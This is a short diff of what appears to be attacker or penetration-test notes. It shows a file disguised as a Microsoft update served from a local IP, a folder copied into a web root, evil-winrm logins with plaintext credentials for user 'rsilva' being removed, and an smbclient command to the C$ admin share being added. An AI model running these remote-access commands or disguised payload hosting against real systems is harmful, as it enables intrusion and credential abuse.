@@ -19,9 +19,7 @@ http://192.168.1.137:8080/microsoft_update.page.zip
 
 sudo cp -r /caminho/para/conectasocial_advanced /var/www/html/
 
-evil-winrm -i 192.168.1.84 -u rsilva -p rsilva2020
-
-evil-winrm -i 192.168.1.84 -u rsilva -p asd123$$$ --timeout 30
+smbclient //192.168.1.84/C$ -U rsilva
 
 
 
